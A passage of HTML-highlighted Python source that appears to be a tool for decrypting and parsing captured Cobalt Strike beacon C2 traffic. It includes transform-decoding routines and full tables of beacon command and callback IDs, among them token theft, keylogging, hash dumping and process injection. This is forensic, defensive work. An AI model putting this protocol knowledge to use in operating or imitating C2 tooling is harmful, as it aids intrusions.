class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_BASE64URL:</span><br><span class="line">                data = __class__.BASE64URLDecode(data)</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_STRREP:</span><br><span class="line">                data = data.replace(operands[<span class="number">0</span>], operands[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_MASK:</span><br><span class="line">                xorkey = data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">                ciphertext = data[<span class="number">4</span>:]</span><br><span class="line">                data = []</span><br><span class="line">                <span class="keyword">for</span> iter, value <span class="keyword">in</span> enumerate(ciphertext):</span><br><span class="line">                    data.append(value ^ xorkey[iter % <span class="number">4</span>])</span><br><span class="line">                data = bytes(data)</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_CONST_HOST_HEADER:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">'Unknown instruction opcode: %d'</span> % opcode)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cCSParser</span><span class="params">(object)</span>:</span></span><br><span class="line">    BEACON_COMMAND_SLEEP = <span class="number">4</span></span><br><span class="line">    BEACON_COMMAND_DATA_JITTER = <span class="number">6</span></span><br><span class="line">    BEACON_COMMAND_RUN = <span class="number">78</span></span><br><span class="line"></span><br><span class="line">    BEACON_COMMANDS = &#123;</span><br><span class="line">        BEACON_COMMAND_SLEEP:  <span class="string">'SLEEP'</span>,</span><br><span class="line">        BEACON_COMMAND_DATA_JITTER:  <span class="string">'DATA_JITTER'</span>,</span><br><span class="line">        <span class="number">11</span>: <span class="string">'DOWNLOAD_START'</span>,</span><br><span class="line">        <span class="number">32</span>: <span class="string">'LIST_PROCESSES'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">3</span>: <span class="string">'EXIT'</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="string">'CD'</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="string">'CHECKIN'</span>,</span><br><span class="line">        <span class="number">11</span>: <span class="string">'DOWNLOAD'</span>,</span><br><span class="line">        <span class="number">12</span>: <span class="string">'EXECUTE'</span>,</span><br><span class="line">        <span class="number">13</span>: <span class="string">'Tasked beacon to spawn features to default process'</span>,</span><br><span class="line">        <span class="number">27</span>: <span class="string">'GETUID'</span>,</span><br><span class="line">        <span class="number">28</span>: <span class="string">'REVERT_TOKEN'</span>,</span><br><span class="line">        <span class="number">33</span>: <span class="string">'KILL'</span>,</span><br><span class="line">        <span class="number">39</span>: <span class="string">'PWD'</span>,</span><br><span class="line">        <span class="number">41</span>: <span class="string">'JOBS'</span>,</span><br><span class="line">        <span class="number">48</span>: <span class="string">'IP_CONFIG'</span>,</span><br><span class="line">        <span class="number">53</span>: <span class="string">'LIST_FILES'</span>,</span><br><span class="line">        <span class="number">54</span>: <span class="string">'MKDIR'</span>,</span><br><span class="line">        <span class="number">55</span>: <span class="string">'DRIVES'</span>,</span><br><span class="line">        <span class="number">56</span>: <span class="string">'RM'</span>,</span><br><span class="line">        <span class="number">72</span>: <span class="string">'SETENV'</span>,</span><br><span class="line">        <span class="number">73</span>: <span class="string">'CP'</span>,</span><br><span class="line">        <span class="number">74</span>: <span class="string">'MV'</span>,</span><br><span class="line">        <span class="number">77</span>: <span class="string">'GETPRIVS'</span>,</span><br><span class="line">        BEACON_COMMAND_RUN: <span class="string">'RUN'</span>,</span><br><span class="line">        <span class="number">80</span>: <span class="string">'DLLLOAD'</span>,</span><br><span class="line">        <span class="number">85</span>: <span class="string">'ARGUE'</span>,</span><br><span class="line">        <span class="number">95</span>: <span class="string">'GETSYSTEM'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BEACON_OUTPUT = &#123;</span><br><span class="line">        <span class="number">1</span>: <span class="string">'OUTPUT_KEYSTROKES'</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="string">'DOWNLOAD_START'</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="string">'OUTPUT_SCREENSHOT'</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="string">'SOCKS_DIE'</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="string">'SOCKS_WRITE'</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="string">'SOCKS_RESUME'</span>,</span><br><span class="line">        <span class="number">7</span>: <span class="string">'SOCKS_PORTFWD'</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="string">'DOWNLOAD_WRITE'</span>,</span><br><span class="line">        <span class="number">9</span>: <span class="string">'DOWNLOAD_COMPLETE'</span>,</span><br><span class="line">        <span class="number">10</span>: <span class="string">'BEACON_LINK'</span>,</span><br><span class="line">        <span class="number">11</span>: <span class="string">'DEAD_PIPE'</span>,</span><br><span class="line">        <span class="number">12</span>: <span class="string">'BEACON_CHECKIN'</span>, <span class="comment"># maybe?</span></span><br><span class="line">        <span class="number">13</span>: <span class="string">'BEACON_ERROR'</span>,</span><br><span class="line">        <span class="number">14</span>: <span class="string">'PIPES_REGISTER'</span>, <span class="comment"># unsure?</span></span><br><span class="line">        <span class="number">15</span>: <span class="string">'BEACON_IMPERSONATED'</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="string">'BEACON_GETUID'</span>,</span><br><span class="line">        <span class="number">17</span>: <span class="string">'BEACON_OUTPUT_PS'</span>,</span><br><span class="line">        <span class="number">18</span>: <span class="string">'ERROR_CLOCK_SKEW'</span>,</span><br><span class="line">        <span class="number">19</span>: <span class="string">'BEACON_GETCWD'</span>,</span><br><span class="line">        <span class="number">20</span>: <span class="string">'BEACON_OUTPUT_JOBS'</span>,</span><br><span class="line">        <span class="number">21</span>: <span class="string">'BEACON_OUTPUT_HASHES'</span>,</span><br><span class="line">        <span class="number">22</span>: <span class="string">'TODO'</span>, <span class="comment"># find out</span></span><br><span class="line">        <span class="number">23</span>: <span class="string">'SOCKS_ACCEPT'</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="string">'BEACON_OUTPUT_NET'</span>,</span><br><span class="line">        <span class="number">25</span>: <span class="string">'BEACON_OUTPUT_PORTSCAN'</span>,</span><br><span class="line">        <span class="number">26</span>: <span class="string">'BEACON_EXIT'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    verctor_command = &#123;</span><br><span class="line">        <span class="string">'COMMAND_SPAWN'</span> : <span class="number">1</span>,</span><br><span class="line">        <span class="string">'COMMAND_SHELL'</span> : <span class="number">2</span>,</span><br><span class="line">        <span class="string">'COMMAND_DIE'</span> : <span class="number">3</span>,</span><br><span class="line">        <span class="string">'COMMAND_SLEEP'</span> : <span class="number">4</span>,</span><br><span class="line">        <span class="string">'COMMAND_CD'</span> : <span class="number">5</span>,</span><br><span class="line"><span class="comment">#        'COMMAND_KEYLOG_START' : 6,</span></span><br><span class="line">        <span class="string">'COMMAND_KEYLOG_STOP'</span> : <span class="number">7</span>,</span><br><span class="line">        <span class="string">'COMMAND_CHECKIN'</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="string">'COMMAND_INJECT_PID'</span> : <span class="number">9</span>,</span><br><span class="line">        <span class="string">'COMMAND_UPLOAD'</span> : <span class="number">10</span>,</span><br><span class="line">        <span class="string">'COMMAND_DOWNLOAD'</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="string">'COMMAND_EXECUTE'</span>: <span class="number">12</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWN_PROC_X86'</span> : <span class="number">13</span>,</span><br><span class="line">        <span class="string">'COMMAND_PROXYLISTENER_CONNECTMESSAGE'</span> : <span class="number">14</span>,</span><br><span class="line">        <span class="string">'COMMAND_PROXYLISTENER_WRITEMESSAGE'</span> : <span class="number">15</span>,</span><br><span class="line">        <span class="string">'COMMAND_PROXYLISTENER_CLOSEMESSAGE'</span> : <span class="number">16</span>,</span><br><span class="line">        <span class="string">'COMMAND_PROXYLISTENER_LISTENMESSAGE'</span> : <span class="number">17</span>,</span><br><span class="line">        <span class="string">'COMMAND_INJECT_PING'</span> : <span class="number">18</span>,</span><br><span class="line">        <span class="string">'COMMAND_DOWNLOAD_CANCEL'</span>: <span class="number">19</span>,</span><br><span class="line">        <span class="string">'COMMAND_FORWARD_PIPE_DATA'</span>: <span class="number">22</span>,</span><br><span class="line">        <span class="string">'COMMAND_UNLINK'</span>: <span class="number">23</span>,</span><br><span class="line">        <span class="string">'COMMAND_PIPE_PONG'</span>: <span class="number">24</span>,</span><br><span class="line">        <span class="string">'COMMAND_GET_SYSTEM'</span>: <span class="number">25</span>,</span><br><span class="line">        <span class="string">'COMMAND_GETUID'</span>: <span class="number">27</span>,</span><br><span class="line">        <span class="string">'COMMAND_REV2SELF'</span>: <span class="number">28</span>,</span><br><span class="line">        <span class="string">'COMMAND_TIMESTOMP'</span>: <span class="number">29</span>,</span><br><span class="line">        <span class="string">'COMMAND_STEALTOKEN'</span>: <span class="number">31</span>,</span><br><span class="line">        <span class="string">'COMMAND_PS'</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="string">'COMMAND_KILL'</span>: <span class="number">33</span>,</span><br><span class="line">        <span class="string">'COMMAND_KerberosTicketUse'</span>: <span class="number">34</span>,</span><br><span class="line">        <span class="string">'COMMAND_Kerberos_Ticket_Purge'</span>: <span class="number">35</span>,</span><br><span class="line">        <span class="string">'COMMAND_POWERSHELL_IMPORT'</span>: <span class="number">37</span>,</span><br><span class="line">        <span class="string">'COMMAND_RUNAS'</span>: <span class="number">38</span>,</span><br><span class="line">        <span class="string">'COMMAND_PWD'</span>: <span class="number">39</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_REGISTER'</span> : <span class="number">40</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOBS'</span>: <span class="number">41</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_KILL'</span>: <span class="number">42</span>,</span><br><span class="line">        <span class="string">'COMMAND_INJECTX64_PID'</span> : <span class="number">43</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWNX64'</span> : <span class="number">44</span>,</span><br><span class="line">        <span class="string">'COMMAND_VNC_INJECT'</span>: <span class="number">45</span>,</span><br><span class="line">        <span class="string">'COMMAND_VNC_INJECT_X64'</span>: <span class="number">46</span>,</span><br><span class="line">        <span class="string">'COMMAND_PAUSE'</span>: <span class="number">47</span>,</span><br><span class="line">        <span class="string">'COMMAND_IPCONFIG'</span>: <span class="number">48</span>,</span><br><span class="line">        <span class="string">'COMMAND_MAKE_TOKEN'</span>: <span class="number">49</span>,</span><br><span class="line">        <span class="string">'COMMAND_PORT_FORWARD'</span>: <span class="number">50</span>,</span><br><span class="line">        <span class="string">'COMMAND_PORT_FORWARD_STOP'</span>: <span class="number">51</span>,</span><br><span class="line">        <span class="string">'COMMAND_BIND_STAGE'</span>: <span class="number">52</span>,</span><br><span class="line">        <span class="string">'COMMAND_LS'</span>: <span class="number">53</span>,</span><br><span class="line">        <span class="string">'COMMAND_MKDIR'</span>: <span class="number">54</span>,</span><br><span class="line">        <span class="string">'COMMAND_DRIVERS'</span>: <span class="number">55</span>,</span><br><span class="line">        <span class="string">'COMMAND_RM'</span>: <span class="number">56</span>,</span><br><span class="line">        <span class="string">'COMMAND_STAGE_REMOTE_SMB'</span>: <span class="number">57</span>,</span><br><span class="line">        <span class="string">'COMMAND_START_SERVICE'</span>: <span class="number">58</span>,  <span class="comment"># not sure</span></span><br><span class="line">        <span class="string">'COMMAND_HTTPHOSTSTRING'</span>: <span class="number">59</span>,</span><br><span class="line">        <span class="string">'COMMAND_OPEN_PIPE'</span>: <span class="number">60</span>,</span><br><span class="line">        <span class="string">'COMMAND_CLOSE_PIPE'</span>: <span class="number">61</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_REGISTER_IMPERSONATE'</span> : <span class="number">62</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWN_POWERSHELLX86'</span> : <span class="number">63</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWN_POWERSHELLX64'</span> : <span class="number">64</span>,</span><br><span class="line">        <span class="string">'COMMAND_INJECT_POWERSHELLX86_PID'</span> : <span class="number">65</span>,</span><br><span class="line">        <span class="string">'COMMAND_INJECT_POWERSHELLX64_PID'</span> : <span class="number">66</span>,</span><br><span class="line">        <span class="string">'COMMAND_UPLOAD_CONTINUE'</span> : <span class="number">67</span>,</span><br><span class="line">        <span class="string">'COMMAND_PIPE_OPEN_EXPLICIT'</span> : <span class="number">68</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWN_PROC_X64'</span> : <span class="number">69</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_SPAWN_X86'</span> : <span class="number">70</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_SPAWN_X64'</span> : <span class="number">71</span>,</span><br><span class="line">        <span class="string">'COMMAND_SETENV'</span> : <span class="number">72</span>,</span><br><span class="line">        <span class="string">'COMMAND_FILE_COPY'</span> : <span class="number">73</span>,</span><br><span class="line">        <span class="string">'COMMAND_FILE_MOVE'</span> : <span class="number">74</span>,</span><br><span class="line">        <span class="string">'COMMAND_PPID'</span> : <span class="number">75</span>,</span><br><span class="line">        <span class="string">'COMMAND_RUN_UNDER_PID'</span> : <span class="number">76</span>,</span><br><span class="line">        <span class="string">'COMMAND_GETPRIVS'</span> : <span class="number">77</span>,</span><br><span class="line">        <span class="string">'COMMAND_EXECUTE_JOB'</span> : <span class="number">78</span>,</span><br><span class="line">        <span class="string">'COMMAND_PSH_HOST_TCP'</span> : <span class="number">79</span>,</span><br><span class="line">        <span class="string">'COMMAND_DLL_LOAD'</span> : <span class="number">80</span>,</span><br><span class="line">        <span class="string">'COMMAND_REG_QUERY'</span> : <span class="number">81</span>,</span><br><span class="line">        <span class="string">'COMMAND_LSOCKET_TCPPIVOT'</span> : <span class="number">82</span>,</span><br><span class="line">        <span class="string">'COMMAND_ARGUE_ADD'</span> : <span class="number">83</span>,</span><br><span class="line">        <span class="string">'COMMAND_ARGUE_REMOVE'</span> : <span class="number">84</span>,</span><br><span class="line">        <span class="string">'COMMAND_ARGUE_LIST'</span> : <span class="number">85</span>,</span><br><span class="line">        <span class="string">'COMMAND_TCP_CONNECT'</span> : <span class="number">86</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_SPAWN_TOKEN_X86'</span> : <span class="number">87</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_SPAWN_TOKEN_X64'</span> : <span class="number">88</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWN_TOKEN_X86'</span> : <span class="number">89</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWN_TOKEN_X64'</span> : <span class="number">90</span>,</span><br><span class="line">        <span class="string">'COMMAND_INJECTX64_PING'</span> : <span class="number">91</span>,</span><br><span class="line">        <span class="string">'COMMAND_BLOCKDLLS'</span> : <span class="number">92</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWNAS_X86'</span> : <span class="number">93</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWNAS_X64'</span> : <span class="number">94</span>,</span><br><span class="line">        <span class="string">'COMMAND_INLINE_EXECUTE'</span> : <span class="number">95</span>,</span><br><span class="line">        <span class="string">'COMMAND_RUN_INJECT_X86'</span> : <span class="number">96</span>,</span><br><span class="line">        <span class="string">'COMMAND_RUN_INJECT_X64'</span> : <span class="number">97</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWNU_X86'</span> : <span class="number">98</span>,</span><br><span class="line">        <span class="string">'COMMAND_SPAWNU_X64'</span> : <span class="number">99</span>,</span><br><span class="line">        <span class="string">'COMMAND_INLINE_EXECUTE_OBJECT'</span> : <span class="number">100</span>,</span><br><span class="line">        <span class="string">'COMMAND_JOB_REGISTER_MSGMODE'</span> : <span class="number">101</span>,</span><br><span class="line">        <span class="string">'COMMAND_LSOCKET_BIND_LOCALHOST'</span> : <span class="number">102</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    verctor_result = &#123;</span><br><span class="line">        <span class="string">'CALLBACK_OUTPUT'</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="string">'CALLBACK_KEYSTROKES'</span> : <span class="number">1</span>,</span><br><span class="line">        <span class="string">'CALLBACK_FILE'</span> : <span class="number">2</span>,</span><br><span class="line">        <span class="string">'CALLBACK_SCREENSHOT'</span> : <span class="number">3</span>,</span><br><span class="line">        <span class="string">'CALLBACK_CLOSE'</span> : <span class="number">4</span>,</span><br><span class="line">        <span class="string">'CALLBACK_READ'</span> : <span class="number">5</span>,</span><br><span class="line">        <span class="string">'CALLBACK_CONNECT'</span> : <span class="number">6</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PING'</span> : <span class="number">7</span>,</span><br><span class="line">        <span class="string">'CALLBACK_FILE_WRITE'</span> : <span class="number">8</span>,</span><br><span class="line">        <span class="string">'CALLBACK_FILE_CLOSE'</span> : <span class="number">9</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PIPE_OPEN'</span> : <span class="number">10</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PIPE_CLOSE'</span> : <span class="number">11</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PIPE_READ'</span> : <span class="number">12</span>,</span><br><span class="line">        <span class="string">'CALLBACK_POST_ERROR'</span> : <span class="number">13</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PIPE_PING'</span> : <span class="number">14</span>,</span><br><span class="line">        <span class="string">'CALLBACK_TOKEN_STOLEN'</span> : <span class="number">15</span>,</span><br><span class="line">        <span class="string">'CALLBACK_TOKEN_GETUID'</span> : <span class="number">16</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PROCESS_LIST'</span> : <span class="number">17</span>,</span><br><span class="line">        <span class="string">'CALLBACK_POST_REPLAY_ERROR'</span> : <span class="number">18</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PWD'</span> : <span class="number">19</span>,</span><br><span class="line">        <span class="string">'CALLBACK_JOBS'</span> : <span class="number">20</span>,</span><br><span class="line">        <span class="string">'CALLBACK_HASHDUMP'</span> : <span class="number">21</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PENDING'</span> : <span class="number">22</span>,</span><br><span class="line">        <span class="string">'CALLBACK_ACCEPT'</span> : <span class="number">23</span>,</span><br><span class="line">        <span class="string">'CALLBACK_NETVIEW'</span> : <span class="number">24</span>,</span><br><span class="line">        <span class="string">'CALLBACK_PORTSCAN'</span> : <span class="number">25</span>,</span><br><span class="line">        <span class="string">'CALLBACK_DEAD'</span> : <span class="number">26</span>,</span><br><span class="line">        <span class="string">'CALLBACK_SSH_STATUS'</span> : <span class="number">27</span>,</span><br><span class="line">        <span class="string">'CALLBACK_CHUNK_ALLOCATE'</span> : <span class="number">28</span>,</span><br><span class="line">        <span class="string">'CALLBACK_CHUNK_SEND'</span> : <span class="number">29</span>,</span><br><span class="line">        <span class="string">'CALLBACK_OUTPUT_OEM'</span> : <span class="number">30</span>,</span><br><span class="line">        <span class="string">'CALLBACK_ERROR'</span> : <span class="number">31</span>,</span><br><span class="line">        <span class="string">'CALLBACK_OUTPUT_UTF8'</span> : <span class="number">32</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, rawkey, hmacaeskeys, hexadecimal, postdataIsMultipartFormat, transform, extract, oOutput)</span>:</span></span><br><span class="line">        self.rawkey = rawkey</span><br><span class="line">        self.hmacaeskeys = hmacaeskeys</span><br><span class="line">        self.hexadecimal = hexadecimal</span><br><span class="line">        self.postdataIsMultipartFormat = postdataIsMultipartFormat</span><br><span class="line">        self.transform = transform</span><br><span class="line">        self.extract = extract</span><br><span class="line">        self.oOutput = oOutput</span><br><span class="line">        self.dCommandsSummary = &#123;&#125;</span><br><span class="line">        self.dCallbacksSummary = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> rawkey == <span class="string">''</span>:</span><br><span class="line">            self.oCrypto = cCrypto(hmacaeskeys=hmacaeskeys)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.oCrypto = cCrypto(rawkey=rawkey)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> __class__.verctor_command.items():</span><br><span class="line">            __class__.BEACON_COMMANDS[value] = key</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> __class__.verctor_result.items():</span><br><span class="line">            __class__.BEACON_OUTPUT[value] = key</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FormatTime</span><span class="params">(epoch=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> epoch == <span class="literal">None</span>:</span><br><span class="line">            epoch = time.time()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%04d%02d%02d-%02d%02d%02d'</span> % time.gmtime(epoch)[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LookupCommand</span><span class="params">(self, commandID)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.BEACON_COMMANDS.get(commandID, <span class="string">'UNKNOWN'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LookupCallback</span><span class="params">(self, callbackID)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.BEACON_OUTPUT.get(callbackID, <span class="string">'UNKNOWN'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ExtractPayload</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.extract:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'payload-%s.vir'</span> % hashlib.md5(data).hexdigest(), <span class="string">'wb'</span>) <span class="keyword">as</span> fWrite:</span><br><span class="line">                fWrite.write(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ProcessPostPacketDataSub</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            oStructData = cStruct(self.oCrypto.Decrypt(data))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.args != (<span class="string">'HMAC signature invalid'</span>,):</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">            self.oOutput.Line(<span class="string">'HMAC signature invalid'</span>)</span><br><span class="line">            self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        counter = oStructData.Unpack(<span class="string">'&gt;I'</span>)</span><br><span class="line">        self.oOutput.Line(<span class="string">'Counter: %d'</span> % counter)</span><br><span class="line">        oStructCallbackdata = cStruct(oStructData.GetString(<span class="string">'&gt;I'</span>))</span><br><span class="line">        callback = oStructCallbackdata.Unpack(<span class="string">'&gt;I'</span>)</span><br><span class="line">        callbackdata = oStructCallbackdata.GetBytes()</span><br><span class="line">        oStructCallbackdataToParse = cStruct(callbackdata)</span><br><span class="line">        self.oOutput.Line(<span class="string">'Callback: %d %s'</span> % (callback, self.LookupCallback(callback)))</span><br><span class="line">        self.dCallbacksSummary[callback] = self.dCallbacksSummary.get(callback, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> callback <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">25</span>]:</span><br><span class="line">            self.oOutput.Line(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.oOutput.Line((callbackdata))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.oOutput.Line(base64.b64encode(callbackdata))</span><br><span class="line">            self.oOutput.Line(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">        <span class="keyword">elif</span> callback == <span class="number">22</span>:</span><br><span class="line">            self.oOutput.Line(repr(callbackdata[:<span class="number">4</span>]))</span><br><span class="line">            self.oOutput.Line(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">            self.oOutput.Line(callbackdata[<span class="number">4</span>:].decode(<span class="string">'latin'</span>))</span><br><span class="line">            self.oOutput.Line(<span class="string">'-'</span> * <span class="number">100</span>)</span><br><span class="line">        <span class="keyword">elif</span> callback == <span class="number">2</span>:</span><br><span class="line">            parameter1, length = oStructCallbackdataToParse.Unpack(<span class="string">'&gt;II'</span>)</span><br><span class="line">            filenameDownload = oStructCallbackdataToParse.GetBytes()</span><br><span class="line">            self.oOutput.Line(<span class="string">' parameter1: %d'</span> % parameter1)</span><br><span class="line">            self.oOutput.Line(<span class="string">' length: %d'</span> % length)</span><br><span class="line">            <span class="keyword">try</span> :</span><br><span class="line">                self.oOutput.Line(<span class="string">' filenameDownload: %s'</span> %(filenameDownload))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.oOutput.Line(<span class="string">' filenameDownload: %s'</span> %base64.b64encode(filenameDownload))</span><br><span class="line">        <span class="keyword">elif</span> callback <span class="keyword">in</span> [<span class="number">17</span>, <span class="number">30</span>, <span class="number">32</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.oOutput.Line((callbackdata))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.oOutput.Line(base64.b64encode(callbackdata))</span><br><span class="line">        <span class="keyword">elif</span> callback <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">8</span>]:</span><br><span class="line">            self.oOutput.Line(<span class="string">' Length: %d'</span> % len(callbackdata[<span class="number">4</span>:]))</span><br><span class="line">            self.oOutput.Line(<span class="string">' MD5: '</span> + hashlib.md5(callbackdata[<span class="number">4</span>:]).hexdigest())</span><br><span class="line">            self.ExtractPayload(callbackdata[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.oOutput.Line(repr(callbackdata))</span><br><span class="line">        extradata = oStructData.GetBytes()[:<span class="number">-16</span>] <span class="comment"># drop hmac</span></span><br><span class="line">        <span class="keyword">if</span> len(extradata) &gt; <span class="number">0</span>:</span><br><span class="line">            self.oOutput.Line(<span class="string">'Extra packet data: %s'</span> % repr(extradata))</span><br><span class="line"></span><br><span class="line">        self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ProcessPostPacketData</span><span class="params">(self, hexdata)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.hexadecimal:</span><br><span class="line">            rawdata = binascii.a2b_hex(hexdata)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rawdata = hexdata</span><br><span class="line">        self.oOutput.Line(<span class="string">'Length raw data: %s'</span> % len(rawdata))</span><br><span class="line">        rawdata = cCSInstructions(cCSInstructions.CS_INSTRUCTION_TYPE_OUTPUT, self.transform).ProcessInstructions(rawdata)</span><br><span class="line">        <span class="keyword">if</span> rawdata == <span class="string">b''</span>:</span><br><span class="line">            self.oOutput.Line(<span class="string">'No data'</span>)</span><br><span class="line">            self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.rawkey == <span class="string">'unknown'</span> <span class="keyword">or</span> self.hmacaeskeys == <span class="string">'unknown'</span>:</span><br><span class="line">            self.oOutput.Line(binascii.b2a_hex(rawdata).decode())</span><br><span class="line">            self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.postdataIsMultipartFormat:</span><br><span class="line">            oStructData = cStruct(rawdata)</span><br><span class="line">            <span class="keyword">while</span> oStructData.Length() &gt; <span class="number">0</span>:</span><br><span class="line">                self.ProcessPostPacketDataSub(oStructData.GetString(<span class="string">'&gt;I'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.ProcessPostPacketDataSub(rawdata)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ProcessReplyPacketData</span><span class="params">(self, hexdata)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.hexadecimal:</span><br><span class="line">            rawdata = binascii.a2b_hex(hexdata)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rawdata = hexdata</span><br><span class="line">        self.oOutput.Line(<span class="string">'Length raw data: %s'</span> % len(rawdata))</span><br><span class="line">        rawdata = cCSInstructions(cCSInstructions.CS_INSTRUCTION_TYPE_INPUT, self.transform).ProcessInstructions(rawdata)</span><br><span class="line">        <span class="keyword">if</span> rawdata == <span class="string">b''</span>:</span><br><span class="line">            self.oOutput.Line(<span class="string">'No data'</span>)</span><br><span class="line">            self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.rawkey == <span class="string">'unknown'</span> <span class="keyword">or</span> self.hmacaeskeys == <span class="string">'unknown'</span>:</span><br><span class="line">            self.oOutput.Line(binascii.b2a_hex(rawdata).decode())</span><br><span class="line">            self.oOutput.Line(<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = self.oCrypto.Decrypt(rawdata)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.args != (<span class="string">'HMAC signature invalid'</span>,):</span><br><span class="line">                <span 